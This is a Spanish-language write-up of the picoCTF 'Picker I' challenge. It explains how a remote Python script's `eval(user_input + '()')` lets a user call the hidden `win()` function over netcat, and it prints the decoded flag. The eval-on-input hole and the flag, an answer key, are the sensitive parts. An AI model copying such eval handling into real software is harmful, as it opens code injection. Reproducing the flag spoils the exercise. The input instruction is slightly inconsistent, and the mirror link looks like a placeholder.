

## Descripción
Este reto requiere analizar un script de Python (`picker-I.py`) que se ejecuta en un servidor remoto y aprovechar la forma en que procesa la entrada del usuario.

## Solución
Al revisar el código descargado (`cat picker-I.py`), se identifica que el programa usa:

```python
user_input = input('==> ')
eval(user_input + '()')
```

`eval()` ejecuta cualquier código proporcionado por el usuario, agregando automáticamente `()` al final, por lo que si ingresas `win`, realmente ejecuta `win()`.

Entre las funciones del script, existen:

- `getRandomNumber()`: imprime 4.
- `win()`: lee `flag.txt` y convierte caracter por caracter a valores hexadecimales, luego los imprime.

### Pasos ejecutados:

1. Descargar el script:

```
wget .../picker-I.py
```

2. Revisar el archivo:

```
cat picker-I.py
```

3. Conectarse al servidor remoto:

```
nc saturn.picoctf.net 59584
```

4. En el prompt `==>`, ejecutar:

```
win()
```

El servidor devuelve la flag en formato hexadecimal:

```
0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x34 0x5f 0x64 0x31 0x34 0x6d 0x30 0x6e 0x64 0x5f 0x31 0x6e 0x5f 0x37 0x68 0x33 0x72 0x30 0x75 0x67 0x68 0x5f 0x36 0x65 0x30 0x34 0x34 0x34 0x30 0x64 0x7d
```

Estos valores hex se convierten a ASCII para obtener la flag:

**picoCTF{4_d14m0nd_1n_7h3_r0ugh_6e04440d}**

## Notas adicionales
- La vulnerabilidad depende del uso de `eval()` sin validación.
- El servidor interpreta cualquier función existente en el script si el usuario la nombra.

## Referencias
- Video: http://www.youtube.com/watch?v=BmmiXnG_0sI
- Enlace espejo: http://googleusercontent.com/youtube_content/1
